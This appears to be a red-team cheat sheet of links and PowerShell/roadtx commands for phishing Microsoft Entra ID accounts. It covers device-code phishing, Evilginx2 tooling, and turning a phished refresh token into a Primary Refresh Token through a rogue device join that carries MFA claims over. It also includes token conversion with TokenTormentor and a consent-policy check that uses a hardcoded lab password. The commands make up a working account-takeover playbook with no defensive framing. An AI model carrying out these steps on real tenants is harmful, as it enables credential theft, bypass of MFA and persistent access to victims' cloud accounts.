# Evilginx2
https://github.com/aalex954/evilginx2-TTPs.git
https://github.com/fin3ss3g0d/evilgophish

# Device Code

Original Articles
https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html
https://aadinternals.com/post/phishing/

Incoming Changes to the FLow and PRT / Windowss Hello
https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/


# refresh token to PRT from Authetnication Broker / MFA condition with interactiveauth
```powershell
$MsAuthBroker = "29d9ed98-a469-4536-ade2-f981bc1d605e"
roadtx interactiveauth -u $user -c $MsAuthBroker -r https://enrollment.manage.microsoft.com/ -ru https://login.microsoft.com/applebroker/msauth

# If No MFA req
$MsAuthBroker = "29d9ed98-a469-4536-ade2-f981bc1d605e"
roadtx gettokens -u $user -c $MsAuthBroker -r https://enrollment.manage.microsoft.com/

# Request Token for Device Registration Service using cached auth
roadtx gettokens --refresh-token file -c $MsAuthBroker -r drs

# Join the Device
roadtx device -a join -n InnocentDevice

# Now that we have a device identity we use the same refresh-token to obtain true PRT
$refresh = ""
roadtx prt --refresh-token $refresh -c InnocentDevice.pem -k InnocentDevice.key 

# Resulting tokens contain the same claims as used during registration, MFA transfers to PRT

# PRT can be used in any authetnication flow to other apps

# PRT Can be used for Browser flows

# Script for doing this outside of ROADTools
https://github.com/kiwids0220/deviceCode2WinHello/tree/main
```

# TokenTormentor - Convert Token Tactics to ROADTools

```powershell
git clone https://github.com/CompassSecurity/TokenTormentor
cd TokenTormentor
pip install -r requirements

# Get-AzureTokens -Client MSGraph
$response | ConvertTo-Json -Depth 5 | Out-File -FilePath token.json
python .\TokenTormentor.py .\token.json
```

New Tools to pull apart
https://blog.compass-security.com/2023/10/device-code-phishing-compass-tooling/
https://github.com/secureworks/squarephish?tab=readme-ov-file
https://github.com/CompassSecurity/TokenPhisher

Adding MFA
https://blog.compass-security.com/2024/01/device-code-phishing-add-your-own-sign-in-methods-on-entra-id/

A tool that combines Device Code and QR Code
https://github.com/secureworks/squarephish?tab=readme-ov-file

Device Code Phishing w/ Verified Apps
https://github.com/secureworks/PhishInSuits

# Check if users can consent

```powershell
Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneC@nGu355ForT3stUs3r" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```